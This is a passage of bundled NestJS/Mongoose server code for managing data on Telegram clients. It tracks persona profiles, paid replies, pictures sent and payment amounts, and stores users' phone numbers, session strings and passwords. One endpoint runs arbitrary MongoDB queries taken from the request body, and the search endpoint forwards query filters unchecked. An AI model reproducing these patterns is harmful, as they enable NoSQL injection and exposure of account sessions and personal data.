    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], UpiIdService);


/***/ }),

/***/ "./src/components/user-data/dto/create-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/create-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDataDto {
}
exports.CreateUserDataDto = CreateUserDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '5787751360', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Total count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Picture count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802722566, description: 'Last message timestamp' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802742567, description: 'Limit time' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Paid count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Profile count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Can reply' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Pay amount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'highestPayAmount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "highestPayAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'cheatCount', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "cheatCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'callTime', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "callTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '-7250939091939055173', description: 'Access hash' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid reply status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Demo given status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second show status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'sneha', description: 'Profile name' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "picsSent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: [], description: 'videos' }),
    __metadata("design:type", Array)
], CreateUserDataDto.prototype, "videos", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/search-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/search-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchDto {
}
exports.SearchDto = SearchDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Picture count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last message timestamp', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Limit time', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Can reply', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pay amount', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username' }),
    __metadata("design:type", String)
], SearchDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Access hash' }),
    __metadata("design:type", String)
], SearchDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid reply status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Second show status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Chat ID' }),
    __metadata("design:type", String)
], SearchDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "picsSent", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/update-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/update-user-data.dto.ts ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_user_data_dto_1 = __webpack_require__(/*! ./create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
class UpdateUserDataDto extends (0, swagger_1.PartialType)(create_user_data_dto_1.CreateUserDataDto) {
}
exports.UpdateUserDataDto = UpdateUserDataDto;


/***/ }),

/***/ "./src/components/user-data/schemas/user-data.schema.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/schemas/user-data.schema.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataSchema = exports.UserData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let UserData = class UserData {
};
exports.UserData = UserData;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "totalCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "picCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "limitTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "paidCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "prfCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "canReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "payAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "accessHash", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "paidReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "demoGiven", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "secondShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: 0 }),
    __metadata("design:type", Number)
], UserData.prototype, "fullShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "profile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "picSent", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "highestPayAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "cheatCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "callTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: [] }),
    __metadata("design:type", Array)
], UserData.prototype, "videos", void 0);
exports.UserData = UserData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UserData);
exports.UserDataSchema = mongoose_1.SchemaFactory.createForClass(UserData);


/***/ }),

/***/ "./src/components/user-data/user-data.controller.ts":
/*!**********************************************************!*\
  !*** ./src/components/user-data/user-data.controller.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const create_user_data_dto_1 = __webpack_require__(/*! ./dto/create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
const search_user_data_dto_1 = __webpack_require__(/*! ./dto/search-user-data.dto */ "./src/components/user-data/dto/search-user-data.dto.ts");
const update_user_data_dto_1 = __webpack_require__(/*! ./dto/update-user-data.dto */ "./src/components/user-data/dto/update-user-data.dto.ts");
let UserDataController = class UserDataController {
    constructor(userDataService) {
        this.userDataService = userDataService;
    }
    async create(createUserDataDto) {
        return this.userDataService.create(createUserDataDto);
    }
    async search(query) {
        return this.userDataService.search(query);
    }
    async findAll() {
        return this.userDataService.findAll();
    }
    async updateAll(chatId, updateUserDataDto) {
        return this.userDataService.updateAll(chatId, updateUserDataDto);
    }
    async findOne(profile, chatId) {
        return this.userDataService.findOne(profile, chatId);
    }
    async update(profile, chatId, updateUserDataDto) {
        return this.userDataService.update(profile, chatId, updateUserDataDto);
    }
    async remove(profile, chatId) {
        return this.userDataService.remove(profile, chatId);
    }
    clearCount(chatId) {
        return this.userDataService.clearCount(chatId);
    }
    async executeQuery(requestBody) {
        try {
            const { query, sort, limit, skip } = requestBody;
            return await this.userDataService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UserDataController = UserDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_data_dto_1.CreateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'User profile' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Chat ID' }),
    (0, swagger_1.ApiQuery)({ name: 'isTesting', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_data_dto_1.SearchDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Patch)('updateAll/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "updateAll", null);
__decorate([
    (0, common_1.Get)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "remove", null);
__decorate([
    (0, common_1.Get)('clear-count'),
    __param(0, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", void 0)
], UserDataController.prototype, "clearCount", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "executeQuery", null);
exports.UserDataController = UserDataController = __decorate([
    (0, swagger_1.ApiTags)('UserData of TG clients'),
    (0, common_1.Controller)('userData'),
    __metadata("design:paramtypes", [user_data_service_1.UserDataService])
], UserDataController);


/***/ }),

/***/ "./src/components/user-data/user-data.module.ts":
/*!******************************************************!*\
  !*** ./src/components/user-data/user-data.module.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const user_data_controller_1 = __webpack_require__(/*! ./user-data.controller */ "./src/components/user-data/user-data.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UserDataModule = class UserDataModule {
};
exports.UserDataModule = UserDataModule;
exports.UserDataModule = UserDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: user_data_schema_1.UserData.name, schema: user_data_schema_1.UserDataSchema, collection: "userData" }])
        ],
        controllers: [user_data_controller_1.UserDataController],
        providers: [user_data_service_1.UserDataService],
        exports: [user_data_service_1.UserDataService]
    })
], UserDataModule);


/***/ }),

/***/ "./src/components/user-data/user-data.service.ts":
/*!*******************************************************!*\
  !*** ./src/components/user-data/user-data.service.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
let UserDataService = class UserDataService {
    constructor(userDataModel) {
        this.userDataModel = userDataModel;
        this.callCounts = new Map();
    }
    async create(createUserDataDto) {
        const createdUser = new this.userDataModel(createUserDataDto);
        return createdUser.save();
    }
    async findAll() {
        return await this.userDataModel.find().exec();
    }
    async findOne(profile, chatId) {
        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();
        if (!user) {
            console.warn(`UserData with ID "${profile} - ${chatId}" not found`);
        }
        const currentCount = this.callCounts.get(chatId) || 0;
        this.callCounts.set(chatId, currentCount + 1);
        if (user) {
            return { ...user, count: this.callCounts.get(chatId) };
        }
        else {
            return undefined;
        }
    }
    clearCount(chatId) {
        if (chatId) {
            this.callCounts.delete(chatId);
            return `Count cleared for chatId: ${chatId}`;
        }
        else {
            this.callCounts.clear();
            return 'All counts cleared.';
        }
    }
    async update(profile, chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        console.log(updateUserDataDto);
        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateAll(chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async remove(profile, chatId) {
        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();
        if (!deletedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.userDataModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userDataModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetPaidUsers() {
        try {
            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now(),
                    paidReply: true
                }
            });
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async incrementTotalCount(profile, chatId, amount = 1) {
        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $inc: { totalCount: amount } }, { new: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return updatedUser;
    }
    async incrementPayAmount(profile, chatId, amount) {
        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $inc: { payAmount: amount } }, { new: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateLastActive(profile, chatId) {
        return await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: { lastActiveTime: new Date() } }, { new: true }).exec();
    }
    async findInactiveSince(date) {
        return await this.userDataModel.find({
            lastActiveTime: { $lt: date }
        }).exec();
    }
    async findByPaymentRange(minAmount, maxAmount) {
        return await this.userDataModel.find({
            payAmount: {
                $gte: minAmount,
                $lte: maxAmount
            }
        }).exec();
    }
    async bulkUpdateUsers(filter, update) {
        try {
            const result = await this.userDataModel.updateMany(filter, update, { new: true }).exec();
            return result;
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async findActiveUsers(threshold = 30) {
        return await this.userDataModel.find({
            totalCount: { $gt: threshold }
        }).sort({ totalCount: -1 }).exec();
    }
    async resetUserCounts(profile, chatId) {
        return await this.userDataModel.findOneAndUpdate({ profile, chatId }, {
            $set: {
                totalCount: 0,
                limitTime: new Date(),
                paidReply: false
            }
        }, { new: true }).exec();
    }
};
exports.UserDataService = UserDataService;
exports.UserDataService = UserDataService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(user_data_schema_1.UserData.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UserDataService);


/***/ }),

/***/ "./src/components/users/dto/create-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/create-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDto {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
        this.movieCount = 0;
        this.photoCount = 0;
        this.videoCount = 0;
        this.otherPhotoCount = 0;
        this.otherVideoCount = 0;
        this.ownPhotoCount = 0;
        this.ownVideoCount = 0;
        this.contacts = 0;
    }
}
exports.CreateUserDto = CreateUserDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
